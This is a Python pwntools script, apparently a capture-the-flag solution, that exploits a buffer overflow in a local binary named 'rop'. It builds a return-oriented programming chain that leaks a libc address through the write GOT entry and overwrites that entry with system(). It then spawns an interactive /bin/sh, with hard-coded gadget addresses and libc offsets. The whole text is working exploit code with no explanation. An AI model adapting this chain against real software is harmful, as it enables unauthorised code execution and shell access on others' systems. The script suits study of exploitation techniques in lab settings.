from pwn import *

p = process('./rop')

pop_rdi = 0x40117e
pop_rsi = 0x401180
pop_rdx = 0x401182

write_plt = 0x401060
read_plt = 0x401070
write_got = 0x404018
read_got = 0x404020

p.recvuntil(b': ')

pay = b'a' * 0x48

pay += p64(pop_rdi) + p64(1)
pay += p64(pop_rsi) + p64(write_got)
pay += p64(pop_rdx) + p64(0x8)
pay += p64(write_plt)

pay += p64(pop_rdi) + p64(0)
pay += p64(pop_rsi) + p64(write_got)
pay += p64(pop_rdx) + p64(0x10)
pay += p64(read_plt)

pay += p64(pop_rdi) + p64(write_got + 0x8)
pay += p64(pop_rdi + 1) # ret gadget
pay += p64(write_plt)

p.send(pay)

libc = u64(p.recv(8)) - 0x114870
system = libc + 0x50d70
print(hex(libc))

pause()
p.send(p64(system) + b'/bin/sh\x00')

p.interactive()